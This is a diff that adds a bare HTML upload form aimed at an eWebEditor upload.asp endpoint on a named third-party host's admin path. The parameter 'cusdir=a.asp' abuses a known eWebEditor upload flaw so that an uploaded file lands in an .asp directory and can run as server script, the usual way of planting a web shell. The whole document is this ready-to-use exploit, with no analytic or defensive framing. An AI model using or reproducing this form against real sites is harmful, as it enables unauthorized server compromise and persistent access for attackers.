@@ -1,0 +1,7 @@
+<form action="http:/skldb.brightdairy.com/webadmin/eWebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=a.asp" method=post name=myform enctype="multipart/form-data">
+ 
+<input type=file name=uploadfile size=100><br><br>
+ 
+<input type=submit value=upload>
+ 
+</form>
